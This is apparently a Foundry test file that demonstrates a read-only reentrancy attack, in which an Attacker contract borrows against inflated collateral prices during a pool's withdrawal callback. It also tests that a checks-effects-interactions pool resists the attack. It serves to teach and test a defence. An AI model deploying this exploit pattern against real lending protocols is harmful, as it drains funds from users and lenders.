// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ReentrantPool} from "../src/readonly/ReentrantPool.sol";
import {SafePool} from "../src/readonly/SafePool.sol";
import {LendingMarket, IPricedPool} from "../src/readonly/LendingMarket.sol";

interface IPool {
    function addLiquidity() external payable returns (uint256);
    function removeLiquidity(uint256) external returns (uint256);
    function pricePerShare() external view returns (uint256);
}

/// Attacker: seeds the pool, pledges half its shares as collateral, then withdraws —
/// and DURING the withdraw ETH callback (when pricePerShare is inflated) reentrantly
/// borrows far more than the collateral is truly worth.
contract Attacker {
    IPool public pool;
    LendingMarket public market;
    bool internal borrowed;
    uint256 public constant DEPOSIT = 100 ether;
    uint256 public constant PLEDGE = 50 ether; // 50e18 shares
    uint256 public constant WITHDRAW = 40 ether; // 40e18 shares
    uint256 public constant BORROW = 80 ether; // only allowed if price is inflated

    constructor(address _pool, address payable _market) {
        pool = IPool(_pool);
        market = LendingMarket(_market);
    }

    function run() external {
        pool.addLiquidity{value: DEPOSIT}();
        market.depositCollateral(PLEDGE);
        pool.removeLiquidity(WITHDRAW); // triggers the callback below
    }

    receive() external payable {
        // Re-enter only on the pool's withdraw send, exactly once.
        if (msg.sender == address(pool) && !borrowed) {
            borrowed = true;
            market.borrow(BORROW);
        }
    }
}

contract ReadOnlyReentrancyTest is Test {
    LendingMarket market;

    function _setupMarketFor(address pool) internal returns (Attacker atk) {
        market = new LendingMarket(IPricedPool(pool));
        market.fund{value: 100 ether}(); // borrowable liquidity
        atk = new Attacker(pool, payable(address(market)));
        vm.deal(address(atk), 100 ether); // attacker's own capital to LP
    }

    function test_readOnlyReentrancy_drainsMarket() public {
        ReentrantPool pool = new ReentrantPool();
        Attacker atk = _setupMarketFor(address(pool));

        uint256 marketBefore = address(market).balance;
        atk.run();

        uint256 fairPrice = pool.pricePerShare(); // settled price (should be 1e18)
        uint256 fairCollateral = (market.collateralShares(address(atk)) * fairPrice) / 1e18;
        uint256 debt = market.debt(address(atk));

        console2.log("settled pricePerShare:", fairPrice);
        console2.log("fair collateral value:", fairCollateral);
        console2.log("attacker debt:", debt);
        console2.log("market drained (wei):", marketBefore - address(market).balance);

        // The exploit: attacker borrowed more than the collateral is truly worth.
        assertGt(debt, fairCollateral, "should be over-collateralized borrow (theft)");
        assertEq(marketBefore - address(market).balance, atk.BORROW(), "market drained by borrow");
    }

    function test_safePool_resistsAttack() public {
        SafePool pool = new SafePool();
        Attacker atk = _setupMarketFor(address(pool));

        // With CEI, price stays consistent in the callback, so the over-borrow check
        // in LendingMarket.borrow reverts UNDERCOLLATERALIZED, bubbling up.
        vm.expectRevert();
        atk.run();
    }
}
